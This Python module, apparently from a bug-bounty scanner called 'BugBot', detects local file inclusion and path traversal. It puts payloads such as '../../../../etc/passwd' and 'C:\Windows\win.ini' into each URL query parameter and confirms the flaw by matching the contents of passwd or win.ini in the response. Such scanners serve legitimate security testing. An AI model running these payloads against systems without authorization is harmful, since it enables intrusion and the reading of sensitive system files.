import logging
from typing import Optional, Dict
from urllib.parse import urlparse, parse_qs, urlunparse
from core.vulns.base import VulnScannerBase

logger = logging.getLogger("BugBot.Vulns.LFI")

class LFIScanner(VulnScannerBase):
    """Motor atómico para detección de LFI/Path Traversal."""
    
    async def check(self, url: str) -> Optional[Dict]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params: return None
        
        payloads = ["/etc/passwd", "C:\\Windows\\win.ini", "../../../../etc/passwd"]
        
        for param in params:
            original = params[param][0]
            for p in payloads:
                params[param] = [p]
                new_query = "&".join([f"{k}={v[0]}" for k, v in params.items()])
                test_url = urlunparse(parsed._replace(query=new_query))
                
                res = await self._safe_get(test_url)
                if res and ("root:x:0:0" in res["content"] or "[extensions]" in res["content"]):
                    return {
                        "url": test_url,
                        "tipo": "LFI",
                        "impacto": "HIGH",
                        "detalles": f"LFI confirmado en parámetro '{param}' con payload {p}"
                    }
                params[param] = [original]
        return None
